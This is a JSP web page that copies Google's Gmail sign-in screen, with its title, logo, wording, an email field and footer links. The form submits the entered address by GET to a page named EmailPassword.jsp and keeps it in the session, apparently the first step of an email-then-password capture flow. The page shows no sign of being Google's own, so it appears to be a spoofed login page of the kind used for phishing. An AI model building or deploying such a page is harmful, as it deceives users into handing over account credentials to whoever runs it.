<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
    <%
   String name = request.getParameter( "Email" );
   session.setAttribute( "Name", name );
%>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>gmail</title>

<style>
.div1{
position:absolute;
width:400px;
height:500px;
marin:20px;
box-shadow: 1px 1px 5px #888888;
margin-left: 31%;
margin-top: 6%;
}
.image{
position:absolute;
width: 80px;
height:80px;
margin-left: 4%;
margin-top: 6%;
}
.Signin
{
position:absolute;
width: 400px;
height:300px;
margin-top: 20%;
font-size:30px;
margin-left: 4%;
}
.phone{
position:absolute;
width: 380px;
height:20px;
margin-left: 4%;
margin-top:46%;
border: 00;
}
.line
{
position:absolute;
margin-top:52%;
width: 370px;
color:#333cff;
margin-left: 4%;
}
.Forgot
{
position:absolute;
height:300px;
font-size:20px;
width: 400px;
margin-top:60%;
margin-left:06%;
color:blue;
}
.button
{
position:absolute;
width: 80px;
height:30px;
margin-left: 70%;
margin-top: 80%;
}
.more
{
position:absolute;
width: 300px;
height:300px;
margin-left: 10%;
margin-top: 80%;
}
.continue
{
position:absolute;
width: 300px;
height:300px;
margin-left: 5%;
margin-top: 28%;
}
.help
{
position:absolute;
width: 300px;
height:300px;
margin-left: 44%;
margin-top: 123%;
font-size:15px;

}
.privacy
{
position:absolute;
width: 300px;
height:300px;
margin-left: 58%;
margin-top: 123%;
font-size:15px;
}
.Terms
{
position:absolute;
width: 300px;
height:300px;
margin-left: 75%;
margin-top: 123%;
font-size:15px;
}
</style>
</head>
<body><form  method="get" action="EmailPassword.jsp" onSubmit="">

<div class="div1">

<img src="google" class="image" alt="google">
<font class="Signin">Sign in </font>
<font class="continue">to continue to Gmail </font>

<input type="text" class="phone" placeholder="Email or phone number" name="Email">
<p></p>
<hr class="line">
<input type="submit" >submit</input>
<p></p>
</form><font class="Forgot">Forgot mail?</font>
<font class="more">More options</font>
<font class="help">Help</font>
<font class="privacy">Privacy</font>
<font class="Terms">Terms</font>
</div>





</body>
</html>